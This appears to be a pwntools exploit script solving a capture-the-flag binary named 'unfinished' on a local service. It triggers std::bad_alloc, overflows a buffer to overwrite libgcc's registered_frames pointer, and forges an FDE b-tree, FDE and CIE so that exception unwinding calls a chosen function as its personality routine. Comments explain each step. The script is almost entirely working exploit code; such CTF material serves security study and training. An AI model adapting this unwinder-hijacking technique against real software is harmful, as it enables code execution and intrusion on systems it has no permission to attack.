
from pwn import *

context.terminal = ['konsole', '-e']

b = ELF("./unfinished")
#io = gdb.debug("./unfinished")
io = remote("localhost", 1447)


payload = b"999999999999999\x00" # causes std::bad_alloc to get thrown


# Our goal is to fake an exception handler so that when its personality function is called, it calls the win function.
# We can overwrite the registered_frames variable
# with our BOF, which points to a data structure that we can fake to contain the information.

# The first structure we fake is the FDE b-tree. Each entry in the FDE b-tree
# corresponds to a range of instruction pointers that the FDE is valid for.
# Since we want our FDE to be used, we need to set the range that our entry covers to be the entire address
# space.

payload += p64(0) # b tree lock
payload += p32(1) # number of entries in b-tree
payload += p32(1) # the node type. 1 corresponds to a leaf node. 
                  # since we want to fake the minimal amount of data as possible
                  # we use a b-tree that consists of a single leaf node with one entry.

# the first and only entry of our b-tree.
payload += p64(0) # start of the range that the node covers
payload += p64(0xffffffffffff) # size of the range the node covers
payload += p64(b.symbols['number'] + len(payload) + 8) # pointer to the corresponding object with more information. We need to fake this as well.
                                                      # we set the pointer to be immediately after this structure

# Now we need to forge the entry. This contains an array of FDEs.
payload += p64(0) + p64(0) + p64(0) # pc_begin, tbase, dbase (not important it seems)
payload += p64(b.symbols['number'] + 96) # pointer to a "sorted" array of entries. We create this at address number+96
payload += p64(641) # bitfield that indicates that the array is sorted (so libgcc doesn't try to sort it as well), and the encoding used for the objects in the array

print(payload)
print(len(payload))
payload = payload.ljust(96, b'\x00') # pad until we get to the entry array
payload += p64(0) # orig_data (no clue what this is)
payload += p64(1) # array size
payload += p64(b.symbols['number'] + 152) # pointer to the specific FDE

payload = payload.ljust(152, b'\x00')
# The FDE itself.
payload += p32(0) # length (ignored)
payload += p32(2**32 - 24) # offset to the corresponding CIE. we'll put it just after the FDE, so it needs to be -24
payload += p64(0) # pc_begin
payload += p64(0xffffffffffff) # pc_range
payload += b'\x00\x00\x00\x00' # padding so the CIE is aligned, which is required

# The CIE
payload += p32(100) # length
payload += p32(0) # CIE_id
payload += p8(1) # version. must be 1-4, and 4 incurs additional checks that we don't want
payload += b"AAAAAP\x00AAAA" # The augmentation (eg. the CIE payload). The important part
                                # is the P\x00, which specifies that there is a personality function. The AAAAs are just padding.
payload += p64(b.symbols['_Z10sigma_modev']) # the personality function pointer itself. note that the symbol is mangled since it's a C++ function.
payload += p8(0) # terminate the augmentation with a null byte (not sure if this is required)


# Point registered_frames to our b-tree
#print(b.symbols['registered_frames'] - b.symbols['number'])
payload = payload.ljust(336, b'A')
payload += p64(b.symbols['number'] + 16)

io.sendline(payload)
io.interactive()
